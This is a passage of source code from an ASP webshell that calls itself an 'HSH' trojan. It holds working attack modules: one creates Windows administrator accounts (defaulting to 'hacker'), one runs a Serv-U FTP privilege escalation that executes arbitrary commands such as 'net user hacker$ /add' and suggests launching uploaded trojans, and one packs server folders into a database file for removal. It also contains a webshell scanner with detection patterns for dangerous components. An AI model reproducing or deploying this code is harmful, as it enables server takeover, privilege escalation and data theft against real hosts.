else
Response.Flush:Response.Flush
tstart=timer()
for i=1 to 1024
Response.Write "<!--567890#########0#########0#########0#########0#########0#########0#########0#########012345-->" & vbcrlf
next
Response.Flush:Response.Flush
tend=timer()
ttime=tend-tstart + 0.00001
tnetspeed=100/(ttime)
tnetspeed2=tnetspeed * 8
twidth=int(tnetspeed * 0.16)+5
if twidth> 300 then twidth=300
tnetspeed=formatnumber(tnetspeed,2,,,0)
tnetspeed2=formatnumber(tnetspeed2,2,,,0)
end if
Function getHTTPPage(url)
dim http
set http=Server.createobject("Microsoft.XMLHTTP")
Http.open "GET",url,false
Http.send()
On Error Resume Next
If Http.Status<>200 then
exit function
end if
getHTTPPage=bytesToBSTR(Http.responseBody,request.form("yy"))
set http=nothing
if err.number<>0 then err.Clear
End function

Function BytesToBstr(body,Cset)
dim objstream
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1
objstream.Mode =3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = Cset
BytesToBstr = objstream.ReadText
objstream.Close
set objstream = nothing
End Function

Function Newstring(wstr,strng)
Newstring=Instr(wstr,strng)
End Function

Case "adduser"
SI="<form action='?action=adduser' method=post><TABLE width=50% border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d><TR><TD colspan=2 class=TBHead><B><FONT color=#ff2222>添加用户</font></B></TD></TR><tr><td class=TBTD><center>用户:<input name='username' type='text' value='hacker'></td></tr><tr><td class=TBTD><center>密码:<input name='passwd' type='text' value='hacker'></td></tr><tr><td class=TBTD><center><input type='submit' Value='添 加'></td></tr></table></form>"
RRS SI
on error resume next
if request.servervariables("REMOTE_ADDR")<>"127.0.0.1" then
response.write "iP !s n0T RiGHt"
else
if request("username")<>"" then
username=request("username")
passwd=request("passwd")
Response.Expires=0
Session.TimeOut=50
Server.ScriptTimeout=3000
set lp=Server.CreateObject("WSCRIPT.NETWORK")
oz="WinNT://"&lp.ComputerName
Set ob=GetObject(oz)
Set oe=GetObject(oz&"/Administrators,group")
Set od=ob.Create("user",username)
od.SetPassword passwd
od.SetInfo
oe.Add oz&"/"&username
if err then
response.write "<font color=red ><center>添加用户失败</font>"
else
if instr(server.createobject("Wscript.shell").exec("cmd.exe /c net user "&username.stdout.readall),"上次登录")>0 then
response.write "<font color=red ><center>虽然没有错误,但是好象也没建立成功.你一定很郁闷吧</font>"
else
Response.write "<font color=red ><center>OMG!"&username&"帐号建立成功!</font>"
end if
end if
else
end if
end if

Case "Servu"
Dim user, pass, port, ftpport, cmd, loginuser, loginpass, deldomain, mt, newdomain, newuser, quit
			dim action1
			action1=request("action1")
			if  not isnumeric(action1) then response.end
			user = trim(request("u"))
			pass = trim(request("p"))
			port = trim(request("port"))
			cmd = trim(request("c"))
			f=trim(request("f"))
			if f="" then
			f=gpath()
			else
			   f=left(f,2)
			end if
			ftpport = 65500
			timeout=3
			loginuser = "User " & user & vbCrLf
			loginpass = "Pass " & pass & vbCrLf
			deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
			mt = "SITE MAINTENANCE" & vbCrLf
			newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=TEST596|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
			newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
					"-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
					"-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
					"-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
					"-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
					"-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
					"-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
			quit = "QUIT" & vbCrLf
			newuser=replace(newuser,"c:",f)
			if action1 = 1 then
				set a=Server.CreateObject("Microsoft.XMLHTTP")
				a.open "GET", "http://127.0.0.1:" & port & "/TEST596/upadmin/s1",True, "", ""
				a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
				set session("a")=a
			RRS "<form method=""post"" name=""goldsun"">"
			RRS "<input name=""u"" type=""hidden"" id=""u"" value="""&user&"""></td>"
			RRS "<input name=""p"" type=""hidden"" id=""p"" value="""&pass&"""></td>"
			RRS "<input name=""port"" type=""hidden"" id=""port"" value="""&port&"""></td>"
			RRS "<input name=""c"" type=""hidden"" id=""c"" value="""&cmd&""" size=""50"">"
			RRS "<input name=""f"" type=""hidden"" id=""f"" value="""&f&""" size=""50"">"
			RRS "<input name=""action1"" type=""hidden"" id=""action1"" value=""2""></form>"
			RRS "<script language=""javascript"">"
			RRS "document.write(""<center>正在连接 127.0.0.1:"&port&",使用用户名: "&user&",口令："&pass&"...<center>"");"
			RRS "setTimeout(""document.all.goldsun.submit();"",4000);"
			RRS "</script>"
			elseif action1 = 2 then
				set b=Server.CreateObject("Microsoft.XMLHTTP")
				b.open "GET", "http://127.0.0.1:" & ftpport & "/TEST596/upadmin/s2", True, "", ""
				b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
			   set session("b")=b
			RRS "<form method=""post"" name=""goldsun"">"
			RRS "<input name=""u"" type=""hidden"" id=""u"" value="""&user&"""></td>"
			RRS "<input name=""p"" type=""hidden"" id=""p"" value="""&pass&"""></td>"
			RRS "<input name=""port"" type=""hidden"" id=""port"" value="""&port&"""></td>"
			RRS "<input name=""c"" type=""hidden"" id=""c"" value="""&cmd&""" size=""50"">"
			RRS "<input name=""f"" type=""hidden"" id=""f"" value="""&f&""" size=""50"">"
			RRS "<input name=""action1"" type=""hidden"" id=""action1"" value=""3""></form>"
			RRS "<script language=""javascript"">"
			RRS "document.write(""<center>正在提升权限,请等待...<center>"");"
			RRS "setTimeout(""document.all.goldsun.submit();"",4000);"
			RRS "</script>"
			elseif action1 = 3 then
				set c=Server.CreateObject("Microsoft.XMLHTTP")
				c.open "GET", "http://127.0.0.1:" & port & "/TEST596/upadmin/s3", True, "", ""
				c.send loginuser & loginpass & mt & deldomain & quit
				set session("c")=c
			RRS "<center>提权完毕,已执行了命令：<br><font color=red>"&cmd&"</font><br><br>"
			RRS "<input type=""button"" value="" 返回继续 "" onClick=location.href=""?Action=Servu"">"
			RRS "</center>"
			 else
			on error resume next
				set a=session("a")
				set b=session("b")
				set c=session("c")
				a.abort
				Set a = Nothing
				b.abort
				Set b = Nothing
				c.abort
				Set c = Nothing
			RRS "<center><form method=post name=goldsun action=""?Action=Servu"">"
			RRS "<table width=""494"" height=""163"" border=""1"" cellpadding=""0"" cellspacing=""1"" bordercolor=""#666666"">"
			RRS "<tr align=""center"" valign=""middle"">"
			RRS "<td colspan=""2"">Servu 提限ASP通杀版<br><br>提示:如果提权不成功就多提交几次<br>命令可以任意修改,例如:cmd /c d:\你上传的木马.exe 或者VBS与COM文件</td>"
			RRS "</tr>"
			RRS "<tr align=""center"" valign=""middle"">"
			RRS "<td width=""100"">用户名:</td>"
			RRS "<td width=""379""><input name=""u"" type=""text"" id=""u"" value=""LocalAdministrator""></td>"
			RRS "</tr>"
			RRS "<tr align=""center"" valign=""middle"">"
			RRS "<td>口　令：</td>"
			RRS "<td><input name=""p"" type=""text"" id=""p"" value=""#l@$ak#.lk;0@P""></td>"
			RRS "</tr>"
			RRS "<tr align=""center"" valign=""middle"">"
			RRS "<td>端　口：</td>"
			RRS "<td><input name=""port"" type=""text"" id=""port"" value=""43958""></td>"
			RRS "</tr>"
			RRS "<tr align=""center"" valign=""middle"">"
			RRS "<td>系统路径：</td>"
			RRS "<td><input name=""f"" type=""text"" id=""f"" value="""&f&""" size=""8""></td>"
			RRS "</tr>"
			RRS "<tr align=""center"" valign=""middle"">"
			RRS "<td>命　令：</td>"
			RRS "<td><input name=""c"" type=""text"" id=""c"" value=""cmd /c net user hacker$ hacker /add & net localgroup administrators hacker$ /add"" size=""50""></td>"
			RRS "</tr>"
			RRS "<tr align=""center"" valign=""middle""><td colspan=""2"">"
			RRS "<input type=""submit"" name=""Submit"" value=""提交"">"
			RRS " <input type=""reset"" name=""Submit2"" value=""重置"">"
			RRS "<input name=""action1"" type=""hidden"" id=""action1"" value=""1""></td>"
			RRS "</tr>"
			RRS "</table></form></center>"
			end if


			function Gpath()
			on error resume next
				err.clear
				set f=Server.CreateObject("Scripting.FileSystemObject")
				if err.number>0 then
				gpath="c:"
					exit function
				end if
			gpath=f.GetSpecialFolder(0)
			gpath=lcase(left(gpath,2))
			set f=nothing
			end function
			Function GName() 
			If request.servervariables("SERVER_PORT")="80" Then 
			GName="http://" & request.servervariables("server_name")&lcase(request.servervariables("script_name")) 
			Else 
			GName="http://" & request.servervariables("server_name")&":"&request.servervariables("SERVER_PORT")&lcase(request.servervariables("script_name")) 
			End If 
			End Function 
			Err.Clear
case "Alexa"
dim AlexaUrl,Top
AlexaUrl=request("u")
Top=Alexa(AlexaUrl)
if AlexaUrl="" then AlexaUrl=""&request.servervariables("http_host")&""
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><tr><td height='20' colspan='3' align='center' bgcolor='menu'>服务器组件信息</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器名</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&request.serverVariables("SERVER_NAME")&"</td></tr><form method=post action='http://www.ip138.com/ips.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器IP</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'><input type='text' name='ip' size='15' value='"&Request.ServerVariables("LOCAL_ADDR")&"'style='border:0px'><input type='submit' value='查询此服务器所在地'style='border:0px'><input type='hidden' name='action' value='2'></td></tr></form><form method=post action='?Action=Alexa' name='form1'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器Alexa排名</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'><input type='text' name='u' value='"&AlexaUrl&"' size=40 style='border:0px'>排名:<input type='text' value='"&Top&"' size=10><input type='submit'  value='查询'></td></tr></form><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器时间</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&now&" </td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器CPU数量</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器操作系统</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("OS")&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>WEB服务器版本</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr>"
For i=0 To 13
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&ObT(i,0)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,1)&"</td><td bgcolor='#FFFFFF' align=left>"&ObT(i,2)&"</td></tr>"
Next
RRS SI
Err.Clear
function Alexa(AlexaURL)
	on error resume next 
	dim getsms,getstr,url
	dim star,endd
	url="http://data.alexa.com/data?cli=10&dat=snba&url="&AlexaURL
	getsms=getHTTPPage(url)
	if getsms<>"" then
		star=instr(getsms,"<REACH RANK=""")+13
		endd=instr(star,getsms,"</SD>")
		getstr=mid(getsms,star,endd-star-4)
	else
		getstr="无排名"
	end if
	if IsNumeric(getstr)=false then getstr="无排名"
	Alexa=getstr
end function
function getHTTPPage(url) 
	on error resume next 
	dim http 
	set http=Server.createobject("Microsoft.XMLHTTP") 
	Http.open "GET",url,false 
	Http.send() 
	if Http.readystate<>4 then
		getHTTPPage=""
		exit function 
	end if 
	getHTTPPage=bytes2BSTR(Http.responseBody) 
	set http=nothing
	if err.number<>0 then err.Clear  
end function 
Function bytes2BSTR(vIn) 
	dim strReturn 
	dim i1,ThisCharCode,NextCharCode 
	strReturn = "" 
	For i1 = 1 To LenB(vIn) 
		ThisCharCode = AscB(MidB(vIn,i1,1)) 
		If ThisCharCode < &H80 Then 
			strReturn = strReturn & Chr(ThisCharCode) 
		Else 
			NextCharCode = AscB(MidB(vIn,i1+1,1)) 
			strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
			i1 = i1 + 1 
		End If 
	Next 
	bytes2BSTR = strReturn 
    Err.Clear
End Function
    Err.Clear
  Case "kmuma"
  	dim Report
	if request.QueryString("act")<>"scan" then
	  	RRS ("<b>网站根目录</b>- "&Server.MapPath("/")&"<br>")
		RRS ("<b>本程序目录</b>- "&Server.MapPath("."))
        RRS (""&copyurl&"")
		RRS "<form action=""?Action=kmuma&act=scan"" method=""post"" name=""form1"">"
		RRS "<p><b>填入你要检查的路径：</b>"
		RRS "<input name=""path"" type=""text"" style=""border:1px solid #999"" value=""."" size=""30"" /> 填“\”网站根目录；“.”为本程序目录<br><br>"
		RRS "你要干什么: <input class=c name=""radiobutton"" type=""radio"" value=""sws"" onClick=""document.getElementById('showFile1').style.display='none'"" checked>查ASP 马"
		RRS "<input class=c type=""radio"" name=""radiobutton"" value=""sf"" onClick=""document.getElementById('showFile1').style.display=''"">搜索符合条件之文件<br>"
		RRS "<br /><div id=""showFile1"" style=""display:none"">"
		RRS "&nbsp;&nbsp;查找内容：<input name=""Search_Content"" type=""text"" id=""Search_Content"" style=""border:1px solid #999"" size=""20"">"
		RRS " 要查找的字符串，不填就只进行日期检查<br />"
		RRS "&nbsp;&nbsp;修改日期：<input name=""Search_Date"" type=""text"" style=""border:1px solid #999"" value="""&Left(Now(),InStr(now()," ")-1)&""" size=""20""> 多个日期用;隔开，任意日期填写 <a href=""#"" onClick=""javascript:form1.Search_Date.value='ALL'"">ALL</a><br />"
		RRS "&nbsp;&nbsp;文件类型：<input name=""Search_FileExt"" type=""text"" style=""border:1px solid #999"" value=""*"" size=""20""> 类型之间用,隔开，*表示所有类型<br /><br /></div>"
		RRS "<input type=""submit"" value="" 开始扫描 "" style=""background:#ccc;border:2px solid #fff;padding:2px 2px 0px 2px;margin:4px;"" />"
		RRS "</form>"
	else
		if request.Form("path")="" then
			RRS("路径不能为空")
			response.End()
		end if
		if request.Form("path")="\" then
			TmpPath = Server.MapPath("\")
		elseif request.Form("path")="." then
			TmpPath = Server.MapPath(".")
		else
			TmpPath = request.Form("path")
		end if
		
		timer1 = timer
		Sun = 0
		SumFiles = 0
		SumFolders = 1
		If request.Form("radiobutton") = "sws" Then
			DimFileExt = "asp,cer,asa,cdx"
			Call ShowAllFile(TmpPath)
		Else
			If request.Form("path") = "" or request.Form("Search_Date") = "" or request.Form("Search_FileExt") = "" Then
				RRS("缉捕条件不完全<br><br><a href='javascript:history.go(-1);'>请返回重新输入</a>")
				response.End()
			End If
			DimFileExt = request.Form("Search_fileExt")
			Call ShowAllFile2(TmpPath)
		End If
RRS "<table width=""100%"" border=""0"" cellpadding=""0"" cellspacing=""0"" style='font-size:12px'>"
RRS "<tr><th>Scan WebShell</tr>"
RRS "<tr><td style=""padding:5px;line-height:170%;clear:both;font-size:12px"">"
RRS "<div id=""updateInfo"" style=""background:ffffe1;border:1px solid #89441f;padding:4px;display:none""></div>"
RRS "扫描完毕！一共检查文件夹<font color=""#FF0000"">"&SumFolders&"</font>个，文件<font color=""#FF0000"">"&SumFiles&"</font>个，发现可疑点<font color=""#FF0000"">"&Sun&"</font>个"
RRS "<table width=""100%"" border=""1"" cellpadding=""0"" cellspacing=""8"" bordercolor=""#999999"" style=""font-size:12px;border-collapse:collapse;line-height:130%;clear:both;""><tr>"
If request.Form("radiobutton") = "sws" Then
	RRS "<td width=""20%"">文件相对路径</td>"
	RRS "<td width=""20%"">特征码</td>"
	RRS "<td width=""40%"">描述</td>"
	RRS "<td width=""20%"">创建/修改时间</td>"
else   
	RRS "<td width=""50%"">文件相对路径</td>"
	RRS "<td width=""25%"">文件创建时间</td>"
	RRS "<td width=""25%"">修改时间</td>"
end if
	RRS "</tr>"
	RRS Report
	RRS "<br/></table>"
timer2 = timer
thetime=cstr(int(((timer2-timer1)*10000 )+0.5)/10)
RRS "<br><font style='font-size:12px'>本页执行共用了"&thetime&"毫秒</font>"
	end if
	Sub ShowAllFile(Path)
	Set F1SO = CreateObject("Scripting.FileSystemObject")
	if not F1SO.FolderExists(path) then exit sub
	Set f = F1SO.GetFolder(Path)
	Set fc2 = f.files
	For Each myfile in fc2
		If CheckExt(F1SO.GetExtensionName(path&"\"&myfile.name)) Then
			Call ScanFile(Path&Temp&"\"&myfile.name, "")
			SumFiles = SumFiles + 1
		End If
	Next
	Set fc = f.SubFolders
	For Each f1 in fc
		ShowAllFile path&"\"&f1.name
		SumFolders = SumFolders + 1
    Next
	Set F1SO = Nothing
End Sub
Sub ScanFile(FilePath, InFile)
Server.ScriptTimeout=999999999
	If InFile <> "" Then
		Infiles = "<font color=red>该文件被<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(InFile)&""" target=_blank>"& InFile & "</a>文件包含执行</font>"
	End If
	Set FSO1s = CreateObject("Scripting.FileSystemObject")
	on error resume next
	set ofile = FSO1s.OpenTextFile(FilePath)
	filetxt = Lcase(ofile.readall())
	If err Then Exit Sub end if
	if len(filetxt)>0 then
		filetxt = vbcrlf & filetxt
		temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(FilePath,server.MapPath("\")&"\","",1,1,1)&"</a><br />"
    temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a > "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a>"	
			If instr( filetxt, Lcase("WScr"&DoMyBest&"ipt.Shell") ) or Instr( filetxt, Lcase("clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8") ) then
				Report = Report&"<tr><td>"&temp&"</td><td>WScr"&DoMyBest&"ipt.Shell 或者 clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8</td><td><font color=red>危险组件，一般被ASP木马利用</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End if
			If instr( filetxt, Lcase("She"&DoMyBest&"ll.Application") ) or Instr( filetxt, Lcase("clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000") ) then
				Report = Report&"<tr><td>"&temp&"</td><td>She"&DoMyBest&"ll.Application 或者 clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000</td><td><font color=red>危险组件，一般被ASP木马利用</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End If
			Set regEx = New RegExp
			regEx.IgnoreCase = True
			regEx.Global = True
			regEx.Pattern = "\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript).encode\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>似乎脚本被加密了</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End If
			regEx.Pattern = "\bEv"&"al\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Ev"&"al</td><td>e"&"val()函数可以执行任意ASP代码<br>但是javascript代码中也可以使用，有可能是误报。"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End If
			regEx.Pattern = "[^.]\bExe"&"cute\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Exec"&"ute</td><td><font color=red>e"&"xecute()函数可以执行任意ASP代码</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End If
			regEx.Pattern = "\.(Open|Create)TextFile\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.CreateTextFile|.OpenTextFile</td><td>使用了FSO的CreateTextFile|OpenTextFile读写文件"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End If
			regEx.Pattern = "\.SaveToFile\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.SaveToFile</td><td>使用了Stream的SaveToFile函数写文件"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End If
			regEx.Pattern = "\.Save\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.Save</td><td>使用了XMLHTTP的Save函数写文件"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End If
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*file\s*=\s*"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*virtual\s*=\s*"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
				Call ScanFile( Server.MapPath("\")&"\"&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()[^""]\)"
		If regEx.Test(filetxt) Then
			Report = Report&"<tr><td>"&temp&"</td><td>Server.Exec"&"ute</td><td><font color=red>不能跟踪检查Server.e"&"xecute()函数执行的文件。</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
			Sun = Sun + 1
		End If
		Set Matches = Nothing
		Set regEx = Nothing
		Set XregEx = New RegExp
		XregEx.IgnoreCase = True
		XregEx.Global = True
		XregEx.Pattern = "<scr"&"ipt\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>"
		Set XMatches = XregEx.Execute(filetxt)
		For Each Match in XMatches
			tmpLake2 = Mid(Match.Value, 1, InStr(Match.Value, ">"))
			srcSeek = InStr(1, tmpLake2, "src", 1)
			If srcSeek > 0 Then
				srcSeek2 = instr(srcSeek, tmpLake2, "=")
				For i = 1 To 50
					tmp = Mid(tmpLake2, srcSeek2 + i, 1)
					If tmp <> " " and tmp <> chr(9) and tmp <> vbCrLf Then
						Exit For
					End If
				Next
				If tmp = """" Then
					tmpName = Mid(tmpLake2, srcSeek2 + i + 1, Instr(srcSeek2 + i + 1, tmpLake2, """") - srcSeek2 - i - 1)
				Else
					If InStr(srcSeek2 + i + 1, tmpLake2, " ") > 0 Then tmpName = Mid(tmpLake2, srcSeek2 + i, Instr(srcSeek2 + i + 1, tmpLake2, " ") - srcSeek2 - i) Else tmpName = tmpLake2
					If InStr(tmpName, chr(9)) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, chr(9)) - 1)
					If InStr(tmpName, vbCrLf) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, vbcrlf) - 1)
					If InStr(tmpName, ">") > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, ">") - 1)
				End If
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tmpName , replace(FilePath,server.MapPath("\")&"\","",1,1,1))
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "CreateO"&"bject[ |\t]*\(.*\)"
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			If Instr(Match.Value, "&") or Instr(Match.Value, "+") or Instr(Match.Value, """") = 0 or Instr(Match.Value, "(") <> InStrRev(Match.Value, "(") Then
				Report = Report&"<tr><td>"&temp&"</td><td>Creat"&"eObject</td><td>Crea"&"teObject函数使用了变形技术"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				exit sub
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
	end if
	set ofile = nothing
	set FSO1s = nothing
End Sub
Sub PageAddToMdb()
Dim theAct, thePath
theAct = Request("theAct")
thePath = Request("thePath")
Server.ScriptTimeOut=100000
If theAct = "addToMdb" Then
addToMdb(thePath)
RRS "<div align=center><br>操作完成!</div>"&BackUrl
Response.End
End If
If theAct = "releaseFromMdb" Then
unPack(thePath)
RRS "<div align=center><br>操作完成!</div>"&BackUrl
Response.End
End If
RRS"<br>文件夹打包:"
RRS"<form method=post>"
RRS"<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
RRS"<input type=hidden value=addToMdb name=theAct>"
RRS"<select name=theMethod><option value=fso>FSO</option><option value=app>无FSO</option>"
RRS"</select>"
RRS" <input type=submit value='开始打包'>"
RRS"<br><br>注: 打包生成HSH.mdb文件,位于HSH木马同级目录下"
RRS"</form>"
RRS"<hr/>文件包解开(需FSO支持):<br/>"
RRS"<form method=post>"
RRS"<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\HSH.mdb"" size=80>"
RRS" <input type=hidden value=releaseFromMdb name=theAct><input type=submit value='解开包'>"
RRS"<br><br>注: 解开来的所有文件都位于HSH木马同级目录下"
RRS"</form>"
End Sub
Sub addToMdb(thePath)
On Error Resume Next
Dim rs, conn, stream, connStr, adoCatalog
Set rs = Server.CreateObject("ADODB.RecordSet")
Set stream = Server.CreateObject("ADODB.Stream")
Set conn = Server.CreateObject("ADODB.Connection")
Set adoCatalog = Server.CreateObject("ADOX.Catalog")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("HSH.mdb")
adoCatalog.Create connStr
conn.Open connStr
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
stream.Open
stream.Type = 1
rs.Open "FileData", conn, 3, 3
If Request("theMethod") = "fso" Then
fsoTreeForMdb thePath, rs, stream
 Else
saTreeForMdb thePath, rs, stream
End If
rs.Close
Conn.Close
stream.Close
Set rs = Nothing
Set conn = Nothing
Set stream = Nothing
Set adoCatalog = Nothing
End Sub
